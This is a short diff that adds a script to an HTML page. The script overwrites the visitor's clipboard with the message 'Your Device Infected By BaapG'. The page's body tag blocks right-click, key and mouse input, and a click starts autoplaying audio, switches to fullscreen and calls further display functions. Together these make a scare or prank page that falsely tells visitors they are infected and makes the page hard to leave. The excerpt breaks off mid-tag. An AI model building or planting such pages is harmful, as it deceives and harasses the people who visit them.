@@ -1,5 +1,15 @@
 <html>
-ead>
+<script>
+var text = "Your Device Infected By BaapG";
+navigator.clipboard.writeText(text).then(function() {
+  console.log('Async: Copying to clipboard was successful!');
+}, function(err) {
+  console.error('Async: Could not copy text: ', err);
+});
+
+</script>
+
+<head>
 
 <body bgcolor="black" text="white" oncontextmenu="return false;" onkeydown="return false;" onmousedown="return false;" onclick="document.getElementById('lagu').play(); fullscreen(); starwars(); display();">
 <audio src="https://ringtone.srkh.in/wp-content/uploads/2020/05/KGF-Maa-Theme-Ringtone-Original-Music.mp3" autoplay="true" id="lagu"></audio
